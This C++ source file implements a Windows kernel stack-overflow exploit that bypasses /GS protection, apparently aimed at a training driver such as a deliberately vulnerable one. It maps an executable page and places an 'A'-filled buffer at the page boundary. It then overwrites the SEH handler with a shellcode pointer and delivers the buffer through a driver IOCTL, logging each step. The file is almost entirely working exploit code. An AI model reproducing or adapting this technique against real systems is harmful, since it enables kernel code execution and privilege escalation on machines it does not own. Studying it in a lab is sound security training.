#include "StackOverflowGS.h"

bool 
ExploitStackOverflowGS::exploit() {
	
	static const size_t Page_Size = 4096;
	static const size_t SEH_Overwrite_Offset = 0x210;

	auto shellcodePointer = adjustPayloadEpilogue(0x14, false);
	
	wcout << L"[+] Step 1: Create anonymous file mapping" << endl;	
	
	HANDLE mapping = CreateFileMapping(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_EXECUTE_READWRITE,
		0,
		Page_Size,
		NULL
	);
	
	if(!mapping) {
		wcerr << L"[!] Could not create anonymous file mapping! Error: 0x" << hex 
			<< setw(8) << setfill(L'0') << GetLastError() << endl;
		return false;
	}
	
	wcout << L"[+] Step 2: Mapping view of file" << endl;	
	
	LPVOID mappedRegion = MapViewOfFile(
		mapping,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		Page_Size
	);
	
	if(!mappedRegion) {
		wcerr << L"[!] Could not map view of file! Error: 0x" << hex 
			<< setw(8) << setfill(L'0') << GetLastError() << endl;
		CloseHandle(mapping);
		return false;
	}
	
	PVOID bufferPointer = reinterpret_cast<PVOID>(
		reinterpret_cast<ULONG>(mappedRegion) + 
		(static_cast<ULONG>(Page_Size - SEH_Overwrite_Offset - 4))
	);
	
	wcout << L"\tFile mapping region at: " << hex << setw(8) << setfill(L'0') << mappedRegion 
		<< L"\n\tAttacker prepared buffer at: " << hex << setw(8) << setfill(L'0') << bufferPointer; 
		
	memset(bufferPointer, 'A', SEH_Overwrite_Offset);
	
	*(reinterpret_cast<DWORD*>(
		&reinterpret_cast<unsigned char*>(bufferPointer)[SEH_Overwrite_Offset]
	)) = reinterpret_cast<DWORD>(*shellcodePointer);
	
	bool ret = driver.SendIOCTL (
		ExploitStackOverflowGS::Ioctl_Code,
		bufferPointer,
		SEH_Overwrite_Offset + 8
	);
	
	CloseHandle(mapping);
	return ret;
}
